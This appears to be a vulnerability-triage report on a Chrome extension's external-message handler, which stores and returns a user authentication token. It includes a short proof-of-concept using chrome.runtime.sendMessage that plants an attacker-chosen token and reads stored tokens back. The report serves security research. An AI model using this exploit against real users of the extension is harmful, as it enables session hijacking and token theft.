# CoCo Analysis: eanhhemabdopmopkdebdinhclhaelfej

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 (all part of the same complete storage exploitation chain)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/eanhhemabdopmopkdebdinhclhaelfej/opgen_generated_files/bg.js
Line 979: userToken = message.token;
Line 982: chrome.storage.local.set({ saveaichats_user_token: message.token }, ...)

**Code:**

```javascript
// Background script - External message handler (lines 974-1019)
chrome.runtime.onMessageExternal.addListener(
  (message, sender, sendResponse) => {
    console.log("Received message:", message);

    if (message.type === "STORE_TOKEN") {
      userToken = message.token; // ← attacker-controlled
      // Store in chrome.storage for persistence
      chrome.storage.local.set(
        { saveaichats_user_token: message.token }, // ← attacker-controlled data stored
        () => {
          console.log("Token stored in extension storage");
        }
      );
      sendResponse({ success: true });
      return true;
    }

    if (message.type === "GET_TOKEN") {
      // First try to get from memory
      if (userToken) {
        sendResponse({ token: userToken }); // ← poisoned data sent back
        return true;
      }

      // If not in memory, try to get from storage
      chrome.storage.local.get(["saveaichats_user_token"], (result) => {
        if (result.saveaichats_user_token) {
          userToken = result.saveaichats_user_token; // ← poisoned data retrieved
          sendResponse({ token: userToken }); // ← poisoned data sent back to attacker
        } else {
          sendResponse({ token: null });
        }
      });
      return true;
    }

    if (message.type === "CLEAR_TOKEN") {
      userToken = null;
      chrome.storage.local.remove("saveaichats_user_token", () => {
        console.log("Token cleared from extension storage");
      });
      sendResponse({ success: true });
      return true;
    }
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From whitelisted domain (*.saveaichats.com or localhost)
// Step 1: Poison the storage with malicious token
chrome.runtime.sendMessage(
  "eanhhemabdopmopkdebdinhclhaelfej", // extension ID
  {
    type: "STORE_TOKEN",
    token: "attacker_controlled_token_12345"
  },
  function(response) {
    console.log("Token stored:", response);
  }
);

// Step 2: Retrieve the poisoned token
chrome.runtime.sendMessage(
  "eanhhemabdopmopkdebdinhclhaelfej",
  { type: "GET_TOKEN" },
  function(response) {
    console.log("Retrieved token:", response.token);
    // response.token = "attacker_controlled_token_12345"
  }
);

// Alternative: Wait for extension to restart and retrieve persisted token
// The poisoned token persists in chrome.storage.local and will be loaded
// on extension restart (line 1024-1029)
```

**Impact:** Complete storage exploitation chain with sensitive data exposure. An attacker controlling a whitelisted domain (localhost or *.saveaichats.com) can poison the chrome.storage.local with an arbitrary token value. The poisoned token is then:
1. Stored persistently in chrome.storage.local
2. Loaded into memory when extension restarts
3. Retrieved and sent back to the attacker via sendResponse when GET_TOKEN message is sent

This allows the attacker to replace legitimate user tokens with malicious ones, potentially hijacking user sessions or causing the extension to use attacker-controlled authentication tokens when communicating with the SaveAIChats service. The attacker can also read back any legitimate tokens that users have stored, leading to authentication token theft.

---

## Sink 2 & 3: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
Sink 2:
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/eanhhemabdopmopkdebdinhclhaelfej/opgen_generated_files/bg.js
Line 1025: if (result.saveaichats_user_token)

Sink 3:
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/eanhhemabdopmopkdebdinhclhaelfej/opgen_generated_files/bg.js
Line 1000: if (result.saveaichats_user_token)

**Classification:** TRUE POSITIVE

**Reason:** These sinks represent the retrieval path of the complete exploitation chain documented in Sink 1. The poisoned token stored via STORE_TOKEN is retrieved from storage (lines 999-1006 and 1024-1029) and sent back to the attacker via sendResponse. This completes the storage exploitation chain: attacker-controlled data → storage.set → storage.get → sendResponse back to attacker.
